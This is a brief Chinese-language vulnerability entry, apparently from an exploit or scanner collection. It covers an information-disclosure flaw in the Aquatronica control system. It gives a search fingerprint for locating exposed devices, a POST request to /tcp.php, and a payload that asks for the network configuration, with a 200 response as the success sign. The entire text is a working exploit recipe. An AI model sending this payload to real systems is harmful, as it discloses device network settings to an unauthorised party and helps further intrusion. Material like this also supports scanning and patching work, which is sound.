# Aquatronica控制系统tcp存在信息泄露漏洞

Aquatronica ｜ 信息泄露 ｜ —
- **指纹**：`title="Aquatronica"`
- **请求**：`POST /tcp.php HTTP/1.1`

**Payload**
```
function_id=tcp_xml_request&command=WS_GET_NETWORK_CFG
```
- **响应特征**：200